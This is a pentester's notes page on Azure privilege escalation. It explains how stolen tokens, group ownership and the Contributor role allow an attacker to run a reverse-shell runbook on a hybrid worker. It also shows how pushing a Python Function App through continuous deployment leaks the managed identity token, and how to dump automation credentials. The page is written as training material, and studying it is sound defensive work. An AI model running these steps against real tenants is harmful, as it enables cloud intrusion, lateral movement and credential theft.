---
title: "Automation Accounts & Function Apps"
source_url: https://notes.incendium.rocks/pentesting-notes/cloud/azure/privilege-escalation/automation-accounts-and-function-apps
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: cloud
---

Azure's automation service that allows to automate tasks for Azure resources, on-prem infra and other cloud providers. (Like a cronjob in Azure).

• Supports Process Automation using Runbooks, Configuration Management (supports DSC), update management and shared resources (credentials, certificates, connections etc) for both Windows and Linux resources hosted on Azure and on-prem.&#x20;

• Some common scenarios for automation as per Microsoft:&#x20;

– Deploy VMs across a hybrid environment using run books.&#x20;

– Identify configuration changes&#x20;

– Configure VMs&#x20;

– Retrieve Inventory

When you get access to a automation account, it will almost for sure get you access to credentials/secrets to escalate your privileges!

### Shared Resources

When you want to automate things, you will probably need to store secrets somewhere. In Azure, we can save these in Shared Resources:

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FJ3rVClcfyQb9d8RkwKag%2Fimage.png?alt=media&amp;token=4eda4169-b8fd-48cc-815f-3b7ba19d93b8" alt=""><figcaption></figcaption></figure>

Automation Accounts also allow managed identity

### Runbook

Runbook contains the automation logic and the code that you want to execute. Azure provides both graphical and textual runbooks. You can use the shared resources and the privileges of the Run As account from a runbook.

Always checkout runbooks, they often have credentials that are not stored in the shared resources

### Hybrid Worker

You can run a runbook on a Azure sandbox OR on a Hybrid Worker. This is used when a runbook is to be run on a non-azure machine. The hybrid worker job run as SYSTEM on Windows and nxautomation account on Linux.

### Abuse example

If you have a shell on a Windows machine that is connected to a Azure user, list the objects. Run `az ad signed-in-user list-owned-objects`and see what this access\_token has access to:

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FmKP8UHnndJwdmrPV3Afy%2Fimage.png?alt=media&amp;token=d937b62b-a414-48a2-b7c6-a0f2a6ab4a72" alt=""><figcaption></figcaption></figure>

Next, get a ms-graph token:

```powershell
az account get-access-token --resource-type ms-graph
```

And in a new local powershell session (preferably), connect to ms-graph:

```powershell
$token = 'E....'
Connect-MgGraph -AccessToken ($Token | ConvertTo-SecureString -AsPlainText -Force)
```

Get-Since our user is only the owner of the `Automation Admins`group, we need to add the user as a member to get permissions.

```powershell
$params = @{ "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/f66e133c-bd01-4b0b-b3b7-xxxxx"}
New-MgGroupMemberByRef -GroupId e6870783-1378-4078-b242-xxxxx-BodyParameter $params
```

Next, back on the revshell check for automation accounts:

```powershell
az automation account list
[
  {
    "automationHybridServiceUrl": null,
    "creationTime": "2021-03-17T14:40:05.340000+00:00",
    "description": null,
    "disableLocalAuth": null,
    "encryption": null,
    "etag": null,
    "id": "/subscriptions/b413826f-108d-4049-8c11-xxxx/resourceGroups/Engineering/providers/Microsoft.Automation/automationAccounts/HybridAutomation",
    "identity": null,
    "lastModifiedBy": null,
    "lastModifiedTime": "2022-10-30T14:26:31.586666+00:00",
    "location": "switzerlandnorth",
    "name": "HybridAutomation",
    "privateEndpointConnections": null,
    "publicNetworkAccess": null,
    "resourceGroup": "Engineering",
    "sku": null,
    "state": null,
    "systemData": null,
    "tags": {},
    "type": "Microsoft.Automation/AutomationAccounts"
  }
]
```

Next, request a access-token for ARM (because we would like to interact with the automation account):

```powershell
az account get-access-token
```

Now, using both the access-token and mg-graphtoken we can connect using Connect-AzAccount:

```
Connect-AzAccount -AccessToken $accesstoken -MicrosoftGraphAccessToken $token -AccountId f66e133c-bd01-4b0b-b3b7-b0b-b3b7-xxxx
```

And list the role assignment:

```powershell
Get-AzRoleAssignment

RoleAssignmentName : c981e312-78da-4698-9702-xxxxx
RoleAssignmentId   : /subscriptions/b413826f-108d-4049-8c11-xxxxx/resourceGroups/Engineering/providers/Microsoft.Automation/automationAccounts/HybridAutomation/providers/Microsoft.Authorization/roleAssignments/c981e312-78da-4698-9702-e7424fae94f8
Scope              : /subscriptions/b413826f-108d-4049-8c11-xxxxx/resourceGroups/Engineering/providers/Microsoft.Automation/automationAccounts/HybridAutomation
DisplayName        : Automation Admins
SignInName         :
RoleDefinitionName : Contributor
RoleDefinitionId   : b24988ac-6180-42a0-ab88-xxxx
ObjectId           : e6870783-1378-4078-b242-xxxx
ObjectType         : Group
CanDelegate        : False
Description        :
ConditionVersion   :
Condition          :
```

The contributor role for on HybridAutomation can create an `runbook`. But before we do that let's check if we can get command execution on a hybrid worker (e.g. a cloud to on-prem lateral movement). We will use `Get-AzAutomationHybridWorkerGroup`to check if there are any hybrid workers.

```powershell
Get-AzAutomationHybridWorkerGroup -AutomationAccountName HybridAutomation -ResourceGroupName Engineering

ResourceGroupName     : Engineering
AutomationAccountName : HybridAutomation
Name                  : Workergroup1
RunbookWorker         : {defeng-adcsrv.xx.corp}
GroupType             : User
```

Next we will create a runbook on hybridautomation with a Powershell reverse shell:

```powershell
Import-AzAutomationRunbook -Name Student60 -Path C:\AzAD\Tools\studentx.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose
```

And publish it:

```powershell
Publish-AzAutomationRunbook -RunbookName student60 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
```

Finally, run it:

```powershell
Start-AzAutomationRunbook -RunbookName student60 -RunOn Workergroup1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
```

If everything went well, you will have a reverse shell inside the Hybrid Worker!

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FnY6fHVhdmZLpHAOEmR9w%2Fimage.png?alt=media&amp;token=415f4c28-2a84-4583-be2a-3bfc09d2ddae" alt=""><figcaption></figcaption></figure>

## Continuous Deployment (DevOps)

Function Apps (Azure Functions), support continuous deployment. A source code update triggers a deployment to Azure. The following source code locations are supported:

* Azure Repos
* GitHub
* Bitbucket

### Abuse example

When we find a Github account that is directly pushing on main when we make a commit, and is starting a action, we can for example copy and paste the following Python script:

```python
import logging, os
import azure.functions as func

def main(req: func.HttpRequest) -> func.HttpResponse:
	logging.info('Python HTTP trigger function processed a request.')
	IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
	IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
	cmd = 'curl "%s?resource=https://management.azure.com&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
	val = os.popen(cmd).read()
	return func.HttpResponse(val, status_code=200)
```

This gets the access token for the managed identity. To know trigger this code, we will need a endpoint.&#x20;

### Export RunBook

```powershell
Export-AzAutomationRunbook -ResourceGroupName "mbt-rg-5" -AutomationAccountName "automation-dev" -Name Schedule-VMStartStop -Output .
```

### Get credential

```powershell
Get-AzAutomationCredential -ResourceGroupName "mbt-rg-5" -AutomationAccountName "automation-dev" | Format-Table Name, CreationTime, Description
```

### Get Variables

```powershell
Get-AzAutomationVariable -ResourceGroupName "mbt-rg-5" -AutomationAccountName "automation-dev" | fl Name, Value, Description
```
